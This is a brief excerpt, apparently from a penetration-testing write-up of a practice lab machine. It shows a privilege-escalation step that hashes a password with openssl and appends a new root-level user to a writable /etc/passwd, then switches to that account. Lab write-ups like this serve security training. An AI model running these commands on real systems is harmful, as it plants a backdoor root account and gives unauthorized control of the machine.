https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/snookums

### Privilege Escalation

```bash
[michael@snookums ~]$ openssl passwd -1 -salt password password 
$1$password$Da2mWXlxe6J7jtww12SNG/
[michael@snookums ~]$ echo 'alvin:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:alvin:/root:/bin/bash' >> /etc/passwd
[michael@snookums ~]$ su alvin
```